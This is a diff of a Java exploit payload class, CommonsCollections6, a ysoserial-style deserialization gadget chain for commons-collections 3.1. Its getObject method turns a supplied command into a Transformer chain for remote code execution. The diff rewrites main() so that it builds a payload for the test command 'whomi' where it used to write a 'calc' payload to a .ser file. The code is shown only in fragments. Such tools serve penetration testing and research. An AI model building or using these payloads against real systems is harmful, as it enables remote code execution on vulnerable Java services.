@@ -17,6 +17,7 @@ import java.util.HashMap;
 import java.util.HashSet;
 import java.util.Map;
 
+
 /**
  * Gadget chain:
  * java.io.ObjectInputStream.readObject()
@@ -37,7 +38,6 @@ import java.util.Map;
 @Dependencies({"commons-collections:commons-collections:3.1"})
 @Authors({Authors.MATTHIASKAISER})
 public class CommonsCollections6 implements ObjectPayload<Serializable> {
-
     public Serializable getObject(PayloadType type, String... param) throws Exception {
         String              command          = param[0];
         final Transformer[] transformers = TransformerUtil.makeTransformer(command);
@@ -88,11 +88,8 @@ public class CommonsCollections6 implements ObjectPayload<Serializable> {
     }
 
     public static void main(String[] args) throws Exception {
-        String           cmd    = "calc";
-        String[]         params = new String[]{cmd};
-        byte[]           bytes = (byte[]) CommonsCollectionsK4.class.getMethod("getObject", PayloadType.class, String[].class).invoke(CommonsCollectionsK4.class.newInstance(), PayloadType.nu1r, params);
-        FileOutputStream fous  = new FileOutputStream("6666.ser");
-        fous.write(bytes);
-        fous.close();
+        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass("CommonsCollections6");
+        ObjectPayload                        payload      = payloadClass.newInstance();
+        Object                               object       = payload.getObject(PayloadType.nu1r,"whomi");
     }
 }
